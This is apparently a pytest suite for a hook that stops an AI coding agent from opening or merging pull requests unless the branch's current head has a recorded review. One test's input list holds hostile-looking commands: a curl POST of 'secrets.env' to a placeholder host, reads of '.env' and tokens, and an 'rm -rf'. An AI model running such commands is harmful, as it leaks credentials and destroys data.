import io
import json
import subprocess
from pathlib import Path

import pytest
from bedrock_hooks import dispatch
from bedrock_hooks.registry import RULES

NOW = "2026-11-03T12:00:00Z"
GIT_ENV = {
    "GIT_AUTHOR_NAME": "Quentin",
    "GIT_AUTHOR_EMAIL": "q@example.com",
    "GIT_COMMITTER_NAME": "Quentin",
    "GIT_COMMITTER_EMAIL": "q@example.com",
}


def git(repo: Path, *args: str) -> str:
    done = subprocess.run(
        ["git", "-C", str(repo), *args],
        capture_output=True,
        text=True,
        check=True,
        env={**GIT_ENV, "PATH": "/usr/bin:/bin", "HOME": str(repo)},
    )
    return done.stdout.strip()


@pytest.fixture
def work(tmp_path: Path) -> Path:
    root = tmp_path / "work"
    (root / ".claude").mkdir(parents=True)
    (root / ".claude" / "bedrock.json").write_text(json.dumps({"project": "Acme"}))
    git(root, "init", "-q", "-b", "main")
    git(root, "add", ".")
    git(root, "commit", "-qm", "init")
    git(root, "checkout", "-qb", "feat/x")
    (root / "a.txt").write_text("a")
    git(root, "add", ".")
    git(root, "commit", "-qm", "a")
    return root


@pytest.fixture
def fake_gh(tmp_path: Path) -> Path:
    """A `gh` that answers `pr view` with $FAKE_GH_VIEW, or fails when it is empty."""
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    script = bin_dir / "gh"
    script.write_text(
        "#!/bin/sh\n"
        'echo "$@" >> "$FAKE_GH_LOG"\n'
        'if [ -z "$FAKE_GH_VIEW" ]; then exit 1; fi\n'
        'printf "%s" "$FAKE_GH_VIEW"\n'
    )
    script.chmod(0o755)
    return bin_dir


def environ(tmp_path: Path, fake_gh: Path | None = None, view: dict | None = None) -> dict:
    path = f"{fake_gh}:/usr/bin:/bin" if fake_gh else "/usr/bin:/bin"
    return {
        "HOME": str(tmp_path / "home"),
        "BEDROCK_NOW": NOW,
        "PATH": path,
        "FAKE_GH_VIEW": json.dumps(view) if view else "",
        "FAKE_GH_LOG": str(tmp_path / "gh.log"),
        **GIT_ENV,
    }


def bash(work: Path, command: str, env: dict, agent: bool = False) -> dict:
    data = {
        "session_id": "s1",
        "cwd": str(work),
        "tool_name": "Bash",
        "tool_input": {"command": command},
    }
    if agent:
        data["agent_id"] = "a1b2c3d4e5"
    out = io.StringIO()
    dispatch.main(["PreToolUse"], io.StringIO(json.dumps(data)), out, env, RULES)
    return json.loads(out.getvalue() or "{}")


def denied(result: dict) -> str:
    specific = result.get("hookSpecificOutput", {})
    return (
        specific.get("permissionDecisionReason", "")
        if specific.get("permissionDecision") == "deny"
        else ""
    )


def record(tmp_path: Path, branch: str, **fields: object) -> None:
    folder = tmp_path / "home/.local/state/bedrock/reviews/Acme"
    folder.mkdir(parents=True, exist_ok=True)
    body = {"passed": True, "ts": NOW, "notes": "", "risk": "R2", **fields}
    (folder / f"{branch.replace('/', '__')}.json").write_text(json.dumps(body))


@pytest.mark.parametrize(
    "command",
    [
        "git push origin main",
        "git push --force origin feat/x",
        "cat .env",
        "grep -r TOKEN .",
        "rm -rf build",
        "curl -X POST https://example.com -d @secrets.env",
        "sudo pacman -S foo",
        "gh pr view 12",
        "gh pr list",
        "gh api -X DELETE repos/o/r/git/refs/heads/x",
        "pytest",
        'F=.env; cat "$F"',
    ],
)
def test_everything_but_a_pull_request_passes(tmp_path: Path, work: Path, command: str) -> None:
    assert bash(work, command, environ(tmp_path)) == {}
    assert bash(work, command, environ(tmp_path), agent=True) == {}


def test_pr_create_without_a_review_is_refused(tmp_path: Path, work: Path) -> None:
    reason = denied(bash(work, "gh pr create --fill", environ(tmp_path)))
    assert "no passed review recorded for 'feat/x'" in reason


def test_pr_create_with_a_failed_review_is_refused(tmp_path: Path, work: Path) -> None:
    head = git(work, "rev-parse", "HEAD")
    record(tmp_path, "feat/x", passed=False, sha=head, agent="a1b2c3d4e5")
    assert "no passed review" in denied(bash(work, "gh pr create --fill", environ(tmp_path)))


def test_old_record_without_a_reviewer_run_is_refused(tmp_path: Path, work: Path) -> None:
    record(tmp_path, "feat/x")
    reason = denied(bash(work, "gh pr create --fill", environ(tmp_path)))
    assert "without a reviewer run" in reason


def test_pr_create_after_a_review_of_the_head_passes(tmp_path: Path, work: Path) -> None:
    record(tmp_path, "feat/x", sha=git(work, "rev-parse", "HEAD"), agent="a1b2c3d4e5")
    assert bash(work, "gh pr create --fill", environ(tmp_path)) == {}


def test_a_commit_after_the_review_voids_it(tmp_path: Path, work: Path) -> None:
    record(tmp_path, "feat/x", sha=git(work, "rev-parse", "HEAD"), agent="a1b2c3d4e5")
    (work / "b.txt").write_text("b")
    git(work, "add", ".")
    git(work, "commit", "-qm", "b")
    assert "commits after its review" in denied(
        bash(work, "gh pr create --fill", environ(tmp_path))
    )


def test_head_flag_names_the_branch(tmp_path: Path, work: Path) -> None:
    git(work, "checkout", "-q", "main")
    sha = git(work, "rev-parse", "feat/x")
    record(tmp_path, "feat/x", sha=sha, agent="a1b2c3d4e5")
    assert bash(work, "gh pr create --head feat/x --fill", environ(tmp_path)) == {}
    assert bash(work, "gh pr create -H owner:feat/x --fill", environ(tmp_path)) == {}
    assert "for 'main'" in denied(bash(work, "gh pr create --fill", environ(tmp_path)))


@pytest.mark.parametrize(
    "command",
    [
        "GH_CONFIG_DIR=/tmp/gh gh pr create --fill",
        "cd . && gh pr create --fill",
        "git push -u origin feat/x && gh pr create --fill",
        "bash -c 'gh pr create --fill'",
    ],
)
def test_pr_create_is_found_inside_longer_commands(
    tmp_path: Path, work: Path, command: str
) -> None:
    assert "no passed review" in denied(bash(work, command, environ(tmp_path)))


def test_agents_are_gated_too(tmp_path: Path, work: Path) -> None:
    assert "no passed review" in denied(bash(work, "gh pr create --fill", environ(tmp_path), True))


def test_unreadable_pr_call_is_refused(tmp_path: Path, work: Path) -> None:
    assert "plain command" in denied(bash(work, "gh pr create --title 'oops", environ(tmp_path)))


def test_merge_checks_the_pull_requests_head(tmp_path: Path, work: Path, fake_gh: Path) -> None:
    sha = git(work, "rev-parse", "HEAD")
    view = {"headRefName": "feat/x", "headRefOid": sha}
    record(tmp_path, "feat/x", sha=sha, agent="a1b2c3d4e5")
    env = environ(tmp_path, fake_gh, view)
    assert bash(work, "gh pr merge 12 --squash -R o/r", env) == {}
    asked = (tmp_path / "gh.log").read_text().splitlines()[-1]
    assert asked == "pr view 12 --json headRefName,headRefOid --repo o/r"


def test_merge_of_an_unreviewed_head_is_refused(tmp_path: Path, work: Path, fake_gh: Path) -> None:
    record(tmp_path, "feat/x", sha=git(work, "rev-parse", "HEAD"), agent="a1b2c3d4e5")
    env = environ(tmp_path, fake_gh, {"headRefName": "feat/x", "headRefOid": "f" * 40})
    assert "commits after its review" in denied(bash(work, "gh pr merge 12 --merge", env))


def test_merge_without_a_number_asks_about_the_current_branch(
    tmp_path: Path, work: Path, fake_gh: Path
) -> None:
    sha = git(work, "rev-parse", "HEAD")
    record(tmp_path, "feat/x", sha=sha, agent="a1b2c3d4e5")
    env = environ(tmp_path, fake_gh, {"headRefName": "feat/x", "headRefOid": sha})
    assert bash(work, "gh pr merge --squash --delete-branch", env) == {}
    asked = (tmp_path / "gh.log").read_text().splitlines()[-1]
    assert asked == "pr view --json headRefName,headRefOid"


def test_merge_that_cannot_read_the_pr_is_refused(
    tmp_path: Path, work: Path, fake_gh: Path
) -> None:
    record(tmp_path, "feat/x", sha=git(work, "rev-parse", "HEAD"), agent="a1b2c3d4e5")
    reason = denied(bash(work, "gh pr merge 12", environ(tmp_path, fake_gh, None)))
    assert "could not read the pull request" in reason


def test_merge_ignores_the_value_of_a_flag(tmp_path: Path, work: Path, fake_gh: Path) -> None:
    sha = git(work, "rev-parse", "HEAD")
    record(tmp_path, "feat/x", sha=sha, agent="a1b2c3d4e5")
    env = environ(tmp_path, fake_gh, {"headRefName": "feat/x", "headRefOid": sha})
    bash(work, "gh pr merge --subject release 12", env)
    asked = (tmp_path / "gh.log").read_text().splitlines()[-1]
    assert asked == "pr view 12 --json headRefName,headRefOid"


def test_merge_reads_a_number_after_a_flag_without_value(
    tmp_path: Path, work: Path, fake_gh: Path
) -> None:
    sha = git(work, "rev-parse", "HEAD")
    record(tmp_path, "feat/x", sha=sha, agent="a1b2c3d4e5")
    env = environ(tmp_path, fake_gh, {"headRefName": "feat/x", "headRefOid": sha})
    bash(work, "gh pr merge --squash --delete-branch 12", env)
    asked = (tmp_path / "gh.log").read_text().splitlines()[-1]
    assert asked == "pr view 12 --json headRefName,headRefOid"


def test_cd_into_the_repository_is_followed(tmp_path: Path, work: Path) -> None:
    outer = work.parent
    record(tmp_path, "feat/x", sha=git(work, "rev-parse", "HEAD"), agent="a1b2c3d4e5")
    assert bash(outer, f"cd {work.name} && gh pr create --fill", environ(tmp_path)) == {}
    assert bash(outer, f"cd {work} && gh pr create --fill", environ(tmp_path)) == {}
    reason = denied(bash(outer, "gh pr create --fill", environ(tmp_path)))
    assert "cannot tell which branch" in reason


def test_cd_elsewhere_after_the_call_does_not_change_it(tmp_path: Path, work: Path) -> None:
    assert "no passed review" in denied(
        bash(work, "gh pr create --fill && cd /", environ(tmp_path))
    )
